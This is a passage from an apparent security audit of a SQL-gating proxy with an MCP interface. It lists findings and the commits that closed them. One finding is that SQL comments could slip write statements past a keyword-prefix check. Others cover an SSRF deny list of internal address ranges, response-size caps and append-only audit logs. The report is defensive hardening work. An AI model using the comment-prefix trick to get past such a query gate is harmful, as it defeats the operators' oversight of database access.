2. HIGH-D8-03: extend ProfileAllowRule with scope fields. Schema
   change in YAML; backwards-compatible.
3. HIGH-D8-04: mirror loopback guard onto mgmt listener.
4. HIGH-D8-05: add `io.LimitReader` to profile install.
5. MED-D8-06 through MED-D8-11: cluster into a "v1.0 hardening"
   slice. None individually blocking but the combination shifts the
   deployment from "intentional log" to "honest log + bounded
   surface".
6. LOW-D8-12 + LOW-D8-13 + INFO-D8-14: opportunistic.

Per [[audit-cadence-discipline]]: this audit found 2 CRITs + 3 HIGHs +
6 MEDs + 2 LOWs + 1 INFO, consistent with the expected range
("1-3 CRITs + several HIGH/MED"). The pattern continues to pay off —
none of these were caught by the 454-test unit + integration suite,
which is itself the signal that focused-audit-after-multi-agent-
landing is the right discipline.

---

## 6. Closures

Mapping each finding to the commit that fixed it (per
[[deliberate-feature-completion]]: a finding is "closed" only when
code + regression tests + this entry all land). Pre-launch scope:
all CRITs + all HIGHs + every MED that fit a small surgical fix.
Larger MEDs deferred to v1.1 with rationale.

| ID         | Status   | Commit  | Notes                                                                                         |
| ---------- | -------- | ------- | --------------------------------------------------------------------------------------------- |
| CRIT-D8-01 | CLOSED   | 77fd0ae | Shared `stripSQLComments` helper; comment-strip before keyword-prefix check in mysql.go.       |
| CRIT-D8-02 | CLOSED   | 77fd0ae | Same helper + integration in snowflake.go + bigquery.go (same root cause).                    |
| HIGH-D8-03 | CLOSED   | 6d58a93 | Path B: fail-fast on scoped allow rules at `CreateProfile` boundary. Path A (schema) → v1.1.   |
| HIGH-D8-04 | CLOSED   | 4c63957 | `--mgmt-host` external-bind guard mirrors `--host` guard + parallel ack flag.                  |
| HIGH-D8-05 | CLOSED   | 0abbcdb | `io.LimitReader` + size cap (1 MiB) on profile-install response body.                         |
| MED-D8-06  | CLOSED   | 6380f4e | SSRF allowlist in `upstream.Resolve`: deny 127/8, 169.254/16, 10/8, 172.16/12, 192.168/16, ::1, fe80::/10, fc00::/7, `.internal` / `.local` TLDs. DNS-rebinding caught via `net.LookupHost`. `--allow-internal-upstream` opt-in for legitimate intranet DBs. |
| MED-D8-07  | CLOSED   | a6ba5b8 | `decisions` append-only via BEFORE UPDATE / BEFORE DELETE triggers.                           |
| MED-D8-08  | CLOSED   | fcb737c | `pending_prompts.decision_id REFERENCES decisions(id)` + `_pragma=foreign_keys(1)`.            |
| MED-D8-09  | CLOSED   | 82f2035 | `--redact-literals` flag + `parser.RedactLiterals` (byte-scan, UTF-8 safe). Audit row's `Statement` swaps quoted string literals → `[REDACTED]` before persistence; `statement_redacted` column added (SchemaVersion 2 → 3) so MCP / `audit tail --json` consumers know SQL isn't replayable. |
| MED-D8-10  | CLOSED   | 5d46614 | `dbounce tasks review TASK_ID` wires `TaskReviewSummary` into a CLI surface; new `PauseDemotedCount` + `PauseDemotedCalls` fields split pause-demoted ALLOWs out of the plain allow count so operators see "what slipped through while paused?" |
| MED-D8-11  | CLOSED   | a6ba5b8 | 16 KiB cap on `tools/call` params at MCP dispatch (applies uniformly to all 9 tools).         |
| LOW-D8-12  | CLOSED   | 0ee770e | DSN pins `synchronous=FULL`. Each `RecordDecision` is its own commit → fsync per audit row. Explicit pin defends against driver/config regressions that would flip to NORMAL / OFF silently. |
| LOW-D8-13  | CLOSED   | 9070bac | `--quiet-banner` on `dbounce run` reduces startup banner to listener address + dialect only; mode / default-policy / profile / upstream / audit-db / read-vs-write framing suppressed. Full config still available via `/healthz`. Banner block extracted to `writeStartupBanner` for testability. |
| INFO-D8-14 | CLOSED   | e20c053 | `stubProfileWriter` removed; `newPromptsCmd` / `newPromptsAnswerCmd` / `newPresetsCmd` / `newPresetsApplyCmd` / `newRulesCmd` / `newRulesRecommendCmd` panic on nil. After #245 the stub was unreachable in production; failing loudly at construction time catches future wiring regressions in CI rather than at operator-run time. |

Test-count delta:
  - audit baseline: 454
  - post-URGENT-pass (CRITs + HIGHs + 3 MEDs at commit b997837): 500
  - post-final-pass (this commit) : 553 — 53 additional regression
    tests added for the 6 deferred findings, across upstream, parser,
    proxy, store, cli packages.

Audit cadence note: each closure was paired with at least one regression
test that fails BEFORE the fix lands + passes after. The literal-
preservation case for the comment stripper (the most likely-to-be-buggy
edge) is covered by TestStripSQLComments_StringLiteralPreserved +
TestStripSQLComments_StringLiteralWithEscapedQuote +
TestStripSQLComments_DoubleQuotedIdentifierPreserved + the per-dialect
LiteralLooksLikeCommentNotStripped tests. The literal-redaction case
(MED-D8-09) cross-checks against the same stripcomments invariants
(TestRedactLiterals_MatchesStripcommentsInvariant) so a future change
to either helper that diverges from the other fails loudly. The SSRF
gate (MED-D8-06) tests every CIDR + both TLD suffixes + the
DNS-rebinding case via a stub LookupHost so the load-bearing
"use net.LookupHost, not URL string parse" invariant is locked in.

Pre-launch v1.0 closure complete: 0 deferred findings remain.
